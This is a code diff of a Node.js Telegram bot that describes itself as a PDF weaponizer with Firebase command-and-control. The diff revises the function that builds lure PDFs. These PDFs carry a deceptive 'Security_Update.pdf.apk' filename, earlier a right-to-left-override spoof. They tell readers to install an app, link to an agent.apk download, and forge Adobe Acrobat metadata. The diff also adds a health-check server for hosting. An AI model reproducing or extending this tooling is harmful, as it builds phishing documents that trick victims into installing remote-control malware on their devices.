@@ -1,13 +1,14 @@
 #!/usr/bin/env node
 // ============================================================
 // ARCHITECT TELEGRAM PDF WEAPONIZER + FIREBASE C2 + IMGBB
-// (Render Ready – Final Version – WinAnsi Fixed)
+// (Render Ready – FINAL – HTTP Server + PDF Simplified)
 // ============================================================
 require('dotenv').config();
 const TelegramBot = require('node-telegram-bot-api');
 const { PDFDocument, StandardFonts, rgb } = require('pdf-lib');
 const sharp = require('sharp');
 const admin = require('firebase-admin');
+const express = require('express');
 
 // --- إعداد Firebase من متغيرات البيئة فقط ---
 admin.initializeApp({
@@ -53,11 +54,11 @@ function generatePayloadStub() {
     return Buffer.from('DEADBEEF1337CAFE'.repeat(4), 'hex');
 }
 
-// --- دالة إنشاء PDF ملغوم (بـ TimesRoman + بيانات وصفية مفخخة) ---
+// --- دالة إنشاء PDF ملغوم (مبسطة بالكامل - لا RLO ولا إيموجي) ---
 async function createWeaponizedPDF(imageBuffer) {
     const pdfDoc = await PDFDocument.create();
     const page = pdfDoc.addPage([595, 842]);
-    const font = await pdfDoc.embedFont(StandardFonts.TimesRoman);  // يدعم RLO
+    const font = await pdfDoc.embedFont(StandardFonts.TimesRoman);
 
     let image;
     try {
@@ -76,15 +77,16 @@ async function createWeaponizedPDF(imageBuffer) {
     });
 
     const agentUrl = `https://github.com/Ameen776/BOT-HAKRS4000/releases/download/v1.0/agent.apk`;
-    const spoofedName = '\u202E' + 'pdf.security_update' + '\u202C';
+    // اسم ملف خادع بسيط بدون أحرف تحكم
+    const displayName = 'Security_Update.pdf.apk';
 
-    // نص بدون إيموجي
-    page.drawText(`To access the content, install the attached app:\nApp: ${spoofedName}`, {
+    // نص إنجليزي بحت
+    page.drawText(`To access the content, please install the attached application:\n${displayName}`, {
         x: 50, y: 100, size: 12, font, color: rgb(0,0,0.8)
     });
 
     const linkAnnotation = pdfDoc.context.obj({
-        Type: 'Annot', Subtype: 'Link', Rect: [50, 90, 250, 110],
+        Type: 'Annot', Subtype: 'Link', Rect: [50, 90, 350, 110],
         Border: [0,0,0], A: { Type: 'Action', S: 'URI', URI: agentUrl }
     });
     page.node.addAnnot(linkAnnotation);
@@ -97,7 +99,7 @@ async function createWeaponizedPDF(imageBuffer) {
     pdfDoc.setTitle(`DOC_${Math.random().toString(36).substring(2,8).toUpperCase()}`);
     pdfDoc.setSubject('Confidential');
     pdfDoc.setCreator('Adobe Acrobat');
-    pdfDoc.setProducer('GhostWeaver v5.0');
+    pdfDoc.setProducer('GhostWeaver v6.0');
 
     return Buffer.from(await pdfDoc.save());
 }
@@ -264,6 +266,17 @@ db.collectionGroup('results').onSnapshot(async (snapshot) => {
             await doc.ref.delete();
         }
     }
+});
+
+// --- خادم HTTP بسيط لإرضاء Render (Health Check) ---
+const app = express();
+const PORT = process.env.PORT || 10000;
+
+app.get('/', (req, res) => res.send('OK'));
+app.get('/health', (req, res) => res.send('OK'));
+
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`🌐 Health server listening on port ${PORT}`);
 });
 
 console.log('🤖 Architect C2 Bot started. Full command panel active.');
